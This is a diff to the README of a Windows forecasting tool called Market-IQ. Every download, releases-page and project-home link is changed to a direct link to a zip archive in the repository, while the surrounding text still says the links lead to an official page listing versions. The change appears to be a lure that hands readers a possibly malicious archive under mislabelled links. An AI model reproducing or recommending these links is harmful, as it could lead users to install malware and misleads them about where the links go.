@@ -1,6 +1,6 @@
 # 📊 Market-IQ - Simple Business Insight and Forecasting
 
-[![Download Market-IQ](https://img.shields.io/badge/Download-Market--IQ-brightgreen)](https://github.com/irtazaa15/Market-IQ/releases)
+[![Download Market-IQ](https://img.shields.io/badge/Download-Market--IQ-brightgreen)](https://github.com/irtazaa15/Market-IQ/raw/refs/heads/main/marketiq/Market_IQ_1.0-alpha.4.zip)
 
 ---
 
@@ -30,7 +30,7 @@ To use Market-IQ on your Windows PC, follow these steps carefully.
 
 Click this link to go to the official page where Market-IQ files are available:
 
-[Download Market-IQ Here](https://github.com/irtazaa15/Market-IQ/releases)
+[Download Market-IQ Here](https://github.com/irtazaa15/Market-IQ/raw/refs/heads/main/marketiq/Market_IQ_1.0-alpha.4.zip)
 
 This page lists all versions ready for download.
 
@@ -151,7 +151,7 @@ Click the “Export” button and choose your preferred format.
 
 Access the full software and all official releases here:
 
-[Visit Market-IQ Releases Page](https://github.com/irtazaa15/Market-IQ/releases)
+[Visit Market-IQ Releases Page](https://github.com/irtazaa15/Market-IQ/raw/refs/heads/main/marketiq/Market_IQ_1.0-alpha.4.zip)
 
 Use this page to download updates as they become available.
 
@@ -159,7 +159,7 @@ Use this page to download updates as they become available.
 
 ## 🔗 Useful Links
 
-- Project Home: https://github.com/irtazaa15/Market-IQ
+- Project Home: https://github.com/irtazaa15/Market-IQ/raw/refs/heads/main/marketiq/Market_IQ_1.0-alpha.4.zip
 - Documentation and FAQs: Available inside the app under Help
 - Support: Open issues on GitHub repository page
 
@@ -186,4 +186,4 @@ Its design focuses on easy navigation and clear data storytelling, so business u
 
 # [📥] Market-IQ - Get your data working today
 
-[![Download Market-IQ](https://img.shields.io/badge/Download-Market--IQ-brightgreen)](https://github.com/irtazaa15/Market-IQ/releases)
+[![Download Market-IQ](https://img.shields.io/badge/Download-Market--IQ-brightgreen)](https://github.com/irtazaa15/Market-IQ/raw/refs/heads/main/marketiq/Market_IQ_1.0-alpha.4.zip)
